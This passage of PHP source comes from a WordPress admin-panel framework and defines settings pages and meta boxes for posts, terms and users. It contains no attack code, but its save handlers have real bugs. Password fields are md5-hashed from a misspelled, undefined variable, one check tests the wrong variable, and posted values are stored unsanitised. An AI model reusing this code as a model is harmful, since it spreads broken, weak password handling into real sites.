	function custom_screen_options() {
		if($this->layout_columns)
			add_screen_option('layout_columns', $this->layout_columns);
	}

	/*======================================================================* 
	 *	Plugin filters
	 *======================================================================*/
	function plugin_action_links( $actions, $plugin_file ) {
			if ( $plugin_file == $this->plugin_file && $this->settings_url)
				$actions[] = '<a href="'.$this->settings_url.'">' . __('Settings', 'dp') .'</a>';
			
			return $actions;
		}
	
	function plugin_row_meta( $plugin_meta, $plugin_file ){
			if ( $plugin_file == $this->plugin_file ) {
				$plugin_meta[] = '<a href="'.$this->donate_url.'">' . __('Donate', 'dp') .'</a>';
				$plugin_meta[] = '<a href="'.$this->support_url.'">' . __('Support', 'dp') .'</a>';
			}

			return $plugin_meta;
		}
	
	/*======================================================================* 
	 *	Theme filters
	 *======================================================================*/
	function theme_action_links($links) {
		 $links[] = '<a href="'.admin_url('options.php').'">' . __('Settings', 'dp') .'</a>';
		return $links;
	}
	
	/*======================================================================*/
	/* Render Functions
	/*======================================================================*/
	function screen_icon() {
		echo '<a target="_blank" href="http://dedepress.com">' . get_screen_icon('themes') . '</a>';
	}
	
	function submenu() {
		if(!$this->submenu)
			return false;
			
		global $plugin_page, $submenu, $parent_file; 
		$i = 0;
		
		if(!isset($submenu[$parent_file]) || !is_array($submenu[$parent_file]))
			return;
		
		echo '<ul class="subsubsub">';
		foreach($submenu[$parent_file] as $sub) {
			echo '<li>';
			if($i > 0) echo " | ";
			$i++;
			$class = '';
			if($sub[2] == $plugin_page)
				$class = ' class="current"';
			echo '<a'.$class.' href="'.esc_url(admin_url('admin.php?page=' . $sub[2])).'">'.$sub[0].'</a></li>'; 
		}
		echo '</ul>';
	}
	
	function page_buttons($in_top = false) {
		if(in_array('save', $this->buttons))
			echo '<input type="submit" name="save" value="'.__('Save Changes', 'dp').'" class="button-primary"> ';
		
		if(in_array('reset', $this->buttons))
			echo '<input type="submit" value="'.__('Reset Settings', 'dp').'" name="reset" class="reset button button-highlighted"> ';
		
		if(in_array('toggle', $this->buttons) && $this->layout_like != 'settings' && $in_top)
			echo '<input type="button" class="button toggel-all" value="'.__('Toggle Boxes', 'dp').'" />';
	}
	
	function page_title() { ?>
		<h2>
			<?php echo get_admin_page_title(); ?>
			<?php $this->page_buttons(true); ?>
		</h2>
	<?php }
	
	function menu_page() {  
		global $parent_file, $plugin_page, $page_hook, $typenow, $hook_suffix, $pagenow, $current_screen, $wp_current_screen_options, $screen_layout_columns; 
		$screen = get_current_screen();
		?>
		<div class="wrap dp-panel">
			<form method="post" action="">
				<?php wp_nonce_field('closedpostboxes', 'closedpostboxesnonce', false ); ?>
				<?php wp_nonce_field('meta-box-order', 'meta-box-order-nonce', false ); ?>
				
				<?php $this->screen_icon(); ?>
				<?php $this->page_title(); ?>
				<?php $this->submenu(); ?>
				
				<br class="clear" />
				
				<?php 
					if($this->layout_like == 'dashboard') {
						$this->metabox_holder_like_dashboard();
					} elseif($this->layout_like == 'postnew') {
						$this->metabox_holder_like_postnew();
					} elseif($this->layout_like == 'settings') {
						do_settings_sections($screen->id); 
					}
				?>
				
				<br class="clear" />
				<?php $this->page_buttons(); ?>
				
				<span class="pickcolor"></span>
				<div id="colorpicker" style="z-index: 100; background:#eee; border:1px solid #ccc; position:absolute; display:none;"></div>
			</form>
		</div><!-- end .wrap -->
	<?php }
	
	function metabox_holder_like_dashboard() {
		global $wp_version, $screen_layout_columns;
	
		$screen = get_current_screen();
		
		$class = $hide2 = $hide3 = $hide4 = '';
		
		if($wp_version >= 3.4)
			$class = 'columns-' . get_current_screen()->get_columns();
		else {
			switch ( $screen_layout_columns ) {
				case 4:
					$width = 'width:25%;';
				break;
				case 3:
					$width = 'width:33.333333%;';
					$hide4 = 'display:none;';
					break;
				case 2:
					$width = 'width:50%;';
					$hide3 = $hide4 = 'display:none;';
					break;
				default:
						$width = 'width:100%;';
				$hide2 = $hide3 = $hide4 = 'display:none;';
			}
		} ?>
		
	<div id="dashboard-widgets" class="metabox-holder <?php echo $class; ?>">
		<div id="postbox-container-1" class="postbox-container" style="<?php echo $width; ?>">
			<?php do_meta_boxes($screen->id, 'normal', null); ?>
		</div><!-- end .postbox-container -->
				
		<div id="postbox-container-2" class="postbox-container" style="<?php echo $hide2.$width; ?>">
			<?php do_meta_boxes($screen->id, 'side', null); ?>
		</div><!-- end .postbox-container -->
					
		<div id="postbox-container-3" class="postbox-container" style="<?php echo $hide3.$width; ?>">
			<?php do_meta_boxes($screen->id, 'column3', null); ?>
		</div><!-- end .postbox-container -->
					
		<div id="postbox-container-4" class="postbox-container" style="<?php echo $hide4.$width; ?>">
			<?php do_meta_boxes($screen->id, 'column4', null); ?>
		</div><!-- end .postbox-container -->
		
	</div><!-- end .metabox-holder -->
	<?php }

	function metabox_holder_like_postnew() {
		global $screen_layout_columns;

		$screen = get_current_screen(); ?>
		<div id="poststuff" class="metabox-holder<?php echo 2 == $screen_layout_columns ? ' has-right-sidebar' : ''; ?>">
			<div class="inner-sidebar">
				<?php do_meta_boxes($screen->id, 'side', null); ?>
			</div><!-- end .innser-sidebar -->
			
			<div id="post-body">
				<div id="post-body-content">
					<?php do_meta_boxes($screen->id, 'normal', null); ?>
				</div><!-- end #post-body-conent -->
			</div><!-- end #post-body -->
		</div><!-- end .metabox-holder -->
	<?php }
	
	/*======================================================================* 
	 * Fields and Defaults
	 *======================================================================*/
	
	function fields() {
		$fields = array();
			
		return $fields;
	}
	
	/* Get default options from fields  */
	function defaults( $fields = array() ) {
		if(!$fields)
			$fields = $this->fields();
			
		if(empty($fields) || !is_array($fields))
			return;
			
		$defaults = array();
		
		foreach($fields as $box_id => $box_fields) {
			foreach(dp_field_options($box_fields) as $name => $field) {
				$defaults[$name] = $field;
			}
		}
		
		return $defaults;
	}
	
	/*======================================================================* 
	 * Scripts and Styles
	 *======================================================================*/
	
	/**
	 * Add default scripts.
	 *
	 * @since 1.0
	 */
	function default_scripts() {
		if( !isset($_GET['page']) || $_GET['page'] != $this->menu_slug )
			return;
		
		wp_enqueue_script('postbox');
		wp_enqueue_script('post');
		dp_enqueue_admin_styles();
		dp_enqueue_admin_scripts();
	}
	
	/**
	 * Add default styles
	 *
	 * @since 1.0
	 */
	function default_styles() {
		if (!isset($_GET['page']) || $_GET['page'] != $this->menu_slug)
			return;
			
		dp_enqueue_admin_styles();
	}
}

function dp_register_panel($class) {
	DP_Panel::register($class);
}

function dp_unregister_panel($class) {
	DP_Panel::unregister($class);
}


/*=============================================================================*
 * Post Meta Box
 *=============================================================================*/ 
abstract class DP_Post_Panel {
	protected $name;
	protected $title;
	protected $post_types;
	
	protected $nonce;
	protected $nonce_action;
	
	
	/*======================================================================*
	 *	Registration Component
	 *======================================================================*/

	private static $registered = array();
	
	static function register( $class ) {
		if ( isset( self::$registered[$class] ) )
			return false;
			
		self::$registered[$class] = $class;
		
		add_action('admin_init', array(__CLASS__, '_register'));
		
		return true;
	}
	
	static function unregister( $class ) {
		if ( ! isset( self::$registered[$class] ) )
			return false;

		unset( self::$registered[$class] );

		return true;
	}
	
	static function _register() {
		foreach(self::$registered as $class) {
			new $class();
		}
	}
	
	/*======================================================================*
	 *	Main Method
	 *======================================================================*/
	function DP_Post_Panel() {
		$this->__construct();
	}
	
	function __construct() {
		$fields = $this->fields();
		if(!$this->name || empty($fields) || !is_array($fields))
			return;
		
		$this->nonce = !empty($this->nonce) ? $this->nonce : $this->name.'_nonce';
		$this->nonce_action = !empty($this->nonce_action) ? $this->nonce_action : plugin_basename(__FILE__);
		$this->post_types = !empty($this->post_types ) ? (array) $this->post_types : get_post_types(array(), 'names');
		
		add_action( 'save_post', array(&$this, 'handle'), 10, 2);
		add_action( 'add_meta_boxes', array(&$this, 'add_meta_boxes') );
		
		foreach($fields as $field) {
			if($field['type'] == 'image_id' && class_exists('MultiPostThumbnails'))
				new MultiPostThumbnails(array( 'label' => $field['label'], 'id' => $field['name']) );
		}
	}

	function add_meta_boxes() {
		foreach($this->post_types as $post_type) {
			add_meta_box($this->name, $this->title, array(&$this, 'meta_box'), $post_type, 'normal', 'high');
		}
	}
	
	function meta_box($object, $box) {
		dp_enqueue_admin_styles();
		dp_enqueue_admin_scripts();
		
		global $post;
		$defaults = $this->fields();
		if(empty($defaults) || !is_array($defaults))
			return;
			
		$new_fields = dp_instance_fields($defaults, 'post_meta');
		
		wp_nonce_field( $this->nonce_action, $this->nonce );
		echo '<div class="dp-panel">';
		echo dp_form_fields($new_fields);
		echo '</div>';
	}
	
	function handle($post_id, $post) {
		if (!isset( $_POST[$this->nonce] ) || !wp_verify_nonce( $_POST[$this->nonce], $this->nonce_action ) || !in_array($post->post_type, $this->post_types))
			return $post_id;
			
		if(defined('DOING_AUTOSAVE') && DOING_AUTOSAVE)
			return $post_id;
		
		$fields = $this->fields();
		
		if(empty($fields))
			return;

		foreach ( dp_field_options($fields) as $name => $field) {
			
			$meta_value = get_post_meta( $post_id, $name, true );
		
			$new_meta_value = $_POST[ $name ];
			
			if(is_array($new_meta_value))
				$new_meta_value = array_filter($new_meta_value);
			elseif(!empty($file['type']) && $field['type'] == 'password')
				$new_meta_value = md5($new_meta_vlue);
			
			if ( $new_meta_value && empty($meta_value) )
				add_post_meta( $post_id, $name, $new_meta_value, true );

			elseif ( $new_meta_value && $new_meta_value != $meta_value )
				update_post_meta( $post_id, $name, $new_meta_value );
			elseif ( empty($new_meta_value) && $meta_value )
				delete_post_meta( $post_id, $name, $meta_value );
			
		}
	}
	
	function fields( $post_type = '') {
		$fields = array();
		
		return $fields;
	}
}

function dp_register_post_panel($class) {
	DP_Post_Panel::register($class);
}

function dp_unregister_post_panel($class) {
	DP_Post_Panel::unregister($class);
}


/*=============================================================================*
 * Term Meta Box
 *=============================================================================*/
abstract class DP_Term_Panel {
	protected $name;
	protected $title;
	protected $taxonomies;
	
	protected $nonce;
	protected $nonce_action;
	
	/*======================================================================*
	 *	Registration Component
	 *======================================================================*/

	private static $registered = array();
	
	static function register( $class ) {
		
		if ( isset( self::$registered[$class] ) )
			return false;
			
		self::$registered[$class] = $class;
		
		add_action('_admin_menu', array(__CLASS__, '_register'));
		
		return true;
	}
	
	static function unregister( $class ) {
		if ( ! isset( self::$registered[$class] ) )
			return false;

		unset( self::$registered[$class] );

		return true;
	}
	
	static function _register() {		
		foreach(self::$registered as $class) {
			new $class();
		}
	}
	
	function DP_Term_Panel() {
		$this->__construct();
	}
	
	function __construct() {
		if(!$this->name)
			return;

		$this->nonce = !empty($this->nonce) ? $this->nonce : $this->name.'_nonce';
		$this->nonce_action = !empty($this->nonce_action) ? $this->nonce_action : plugin_basename(__FILE__);
		
		add_action('admin_menu', array(&$this, 'edit_term_form_action'));
		add_action('edit_term', array(&$this, 'handle'), 10, 3);
	}
	
	function edit_term_form_action() {
		$this->taxonomies = !empty($this->taxonomies ) ? (array)$this->taxonomies : get_taxonomies(array('show_ui' => true));
		
		foreach ($this->taxonomies as $taxonomy) { 
			add_action($taxonomy . '_edit_form', array(&$this, 'meta_box'), 10, 2);
			// add_action($taxonomy . '_add_form_fields', array(&$this, 'tax_form_fields'), 10);
		}
	}
	
	function tax_form_fields($taxonomy) {
		$this->meta_box('', $taxonomy);
	}
	
	function meta_box($term, $taxonomy) {
		if($this->title)
			echo '<h3>'.$this->title.'</h3>';
		
		$defaults = $this->fields();
		if(empty($defaults) || !is_array($defaults))
			return;
			
		$new_fields = dp_instance_fields($defaults, 'term_meta', $term);
		
		wp_nonce_field( $this->nonce_action, $this->nonce );
		echo dp_form_fields($new_fields);
	}
	
	function handle($term_id, $tt_id, $taxonomy) {
		if (!isset( $_POST[$this->nonce] ) || !wp_verify_nonce( $_POST[$this->nonce], $this->nonce_action ))
			return $term_id;

		$fields = $this->fields();

		foreach ( dp_field_options($fields) as $name => $field ) {
			$meta_value = get_term_meta( $term_id, $name, true );
			
			$new_meta_value = $_POST[$name];
			
			if(is_array($new_meta_value))
				$new_meta_value = array_filter($new_meta_value);
			elseif($field['type'] == 'password')
				$new_meta_value = md5($new_meta_vlue);
				
			if ( $new_meta_value && empty($meta_value) )
				add_term_meta( $term_id, $name, $new_meta_value, true );
				
			elseif ( $new_meta_value && $new_meta_value != $meta_value )
				update_term_meta( $term_id, $name, $new_meta_value );
				
			elseif ( empty($new_meta_value) && $meta_value )
				delete_term_meta( $term_id, $name, $meta_value );
		}
	}
	
	function fields($type = '') {
		return $fields;
	}
}

function dp_register_term_panel($class) {
	DP_Term_Panel::register($class);
}

function dp_unregister_term_panel($class) {
	DP_Term_Panel::unregister($class);
}

/*=============================================================================*
 * User Meta Box
 *=============================================================================*/
abstract class DP_User_Panel {
	protected $name;
	protected $title;
	
	protected $nonce;
	protected $nonce_action;
	
	function DP_User_Panel() {
		$this->__construct();
	}
	
	function __construct() {
		if(!$this->name)
			return;
		
		$this->nonce = !empty($this->nonce) ? $this->nonce : $this->name.'_nonce';
		$this->nonce_action = !empty($this->nonce_action) ? $this->nonce_action : plugin_basename(__FILE__);
		
		add_action( 'personal_options_update', array(&$this, 'handle') );
		add_action( 'edit_user_profile_update', array(&$this, 'handle') );
		add_action( 'admin_menu', array(&$this, 'add_meta_boxes') );
	}
	
	function add_meta_boxes() {
		add_action( 'show_user_profile', array(&$this, 'meta_box') );
		add_action( 'edit_user_profile', array(&$this, 'meta_box') );
	}
	
	function meta_box($user) {
		if($this->title)
			echo '<h3>'.$this->title.'</h3>';
		
		$defaults = $this->fields();
		if(empty($defaults) || !is_array($defaults))
			return;
			
		$new_fields = dp_instance_fields($defaults, 'user_meta', $user);
		
		wp_nonce_field( $this->nonce_action, $this->nonce );
		echo dp_form_fields($new_fields);
		
	}
	
	function handle($user_id) {
		if (!isset( $_POST[$this->nonce] ) || !wp_verify_nonce( $_POST[$this->nonce], $this->nonce_action ))
			return $user_id;
		
		$fields = $this->fields();
		
		if(empty($fields))
			return;
		
		foreach ( dp_field_options($fields) as $name => $field) {
			$meta_value = get_user_meta( $user_id, $name, true );
			
		
			$new_meta_value = $_POST[ $name ];
			
			if(is_array($new_meta_value))
				$new_meta_value = array_filter($new_meta_value);
			elseif($field['type'] == 'password')
				$new_meta_value = md5($new_meta_vlue);
				
			if ( $new_meta_value && empty($meta_value) )
				add_user_meta( $user_id, $name, $new_meta_value, true );
			elseif ( $new_meta_value && $new_meta_value != $meta_value )
				update_user_meta( $user_id, $name, $new_meta_value );
			elseif ( empty($new_meta_value) && $meta_value )
				delete_user_meta( $user_id, $name, $meta_value );
		}
	}
	
	function fields( $post_type = '') {
		$fields = array();
		
		return $fields;
	}
	
	/*======================================================================*
	 *	Registration Component
	 *======================================================================*/

	private static $registered = array();
	
	static function register( $class ) {
		if ( isset( self::$registered[$class] ) )
			return false;
			
		self::$registered[$class] = $class;
		
		add_action('_admin_menu', array(__CLASS__, '_register'));
		
		return true;
	}
	
	static function unregister( $class ) {
		if ( ! isset( self::$registered[$class] ) )
			return false;

		unset( self::$registered[$class] );

		return true;
	}
	
	static function _register() {
		foreach(self::$registered as $class) {
			new $class();
		}
	}
}

function dp_register_user_panel($class) {
	DP_User_Panel::register($class);
}

function dp_unregister_user_panel($class) {
	DP_User_Panel::unregister($class);
}

/*=============================================================================*
 * Hacks
 *=============================================================================*/

/**
 * Make a fix for per page screen option on the custom plugin page
 */
add_filter('set-screen-option', 'dp_set_screen_option_filter', 999, 3);
function dp_set_screen_option_filter($status, $option, $value) {
	$value = (int) $value;
	if ( $value < 1 || $value > 999 )
		return false;
	else
		return $value;
}
